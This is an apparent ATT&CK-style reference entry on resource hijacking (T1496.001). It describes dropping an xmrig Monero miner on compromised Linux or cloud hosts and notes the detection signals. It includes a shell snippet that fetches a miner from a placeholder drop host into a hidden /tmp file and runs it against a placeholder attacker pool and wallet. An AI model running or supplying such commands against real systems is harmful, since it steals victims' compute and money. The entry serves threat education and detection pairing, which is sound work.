---
id: resource-hijack-xmrig
title: Resource hijacking (cryptomining on compromised hosts)
section: Impact
phase: Impact
attack:
  tactic: TA0040
  techniques: [T1496.001]
platform: [linux]
source: MITRE ATT&CK T1496.001; xmrig / cryptojacking payloads
pair: cryptomine-pool-detect
---

Monetize access directly by stealing compute: drop a Monero miner (xmrig and its
forks are the standard) that pegs CPU/GPU and connects to a mining pool over the
Stratum protocol. On cloud footholds the same idea scales by spinning up large or
GPU instances purely to mine. It's noisy by design — sustained ~100% CPU and a
persistent outbound connection to a pool on the usual Stratum ports — which is
exactly what makes it detectable.

```sh
# fetch + run a miner against an attacker pool/wallet (illustrative)
curl -sL https://<drop>/xmrig -o /tmp/.x && chmod +x /tmp/.x
/tmp/.x -o stratum+tcp://<pool>:3333 -u <wallet> -k --tls --cpu-max-threads-hint=90
```
